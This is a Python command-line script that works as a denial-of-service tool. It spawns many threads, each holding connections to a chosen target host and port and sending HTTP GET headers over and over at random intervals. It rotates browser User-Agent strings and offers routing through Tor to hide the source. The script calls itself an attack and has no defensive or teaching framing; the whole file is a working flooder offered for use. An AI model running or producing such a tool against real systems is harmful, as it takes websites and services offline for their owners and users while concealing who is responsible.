import socket
import threading
import time
import random
import sys

try:
    import socks  # Ensure PySocks is installed
    socks_available = True
except ModuleNotFoundError:
    print("[WARNING] PySocks module not found. Tor connections will be disabled.")
    socks_available = False

# User-Agent list
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

def get_random_user_agent():
    return random.choice(user_agents)

def attack(target, port, use_tor):
    port = int(port)
    if port < 1 or port > 65535:
        print("[ERROR] Invalid port number.")
        return

    while True:
        try:
            if use_tor and socks_available:
                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                s = socks.socksocket()
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            s.settimeout(5)
            s.connect((target, port))
            headers = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {get_random_user_agent()}\r\nConnection: keep-alive\r\n\r\n"
            
            while True:
                try:
                    s.send(headers.encode())
                    time.sleep(random.uniform(5, 15))  # Randomized sleep interval
                except socket.error:
                    print("[INFO] Re-establishing connection...")
                    break  # Exit inner loop and reconnect
        except Exception as e:
            print(f"[INFO] Temporary network issue: {e}")
            time.sleep(3)  # Wait before retrying
        finally:
            s.close()

def main():
    if len(sys.argv) < 5:
        print("Usage: python3 kasongo2.py <target> <port> <connections> <useTor[true/false]>")
        return
    
    target = sys.argv[1]
    try:
        connections = int(sys.argv[3])
        if connections < 1:
            raise ValueError("Connections must be a positive integer.")
    except ValueError as ve:
        print(f"[ERROR] {ve}")
        return
    
    use_tor = sys.argv[4].lower() == "true"
    if use_tor and not socks_available:
        print("[WARNING] Tor mode enabled but PySocks is unavailable. Proceeding without Tor.")
        use_tor = False
    
    threads = []
    for _ in range(connections):
        thread = threading.Thread(target=attack, args=(target, sys.argv[2], use_tor))
        thread.daemon = True  # Allows clean exit
        thread.start()
        threads.append(thread)
    
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\n[INFO] Stopping attack...")
        sys.exit(0)

if __name__ == "__main__":
    main()
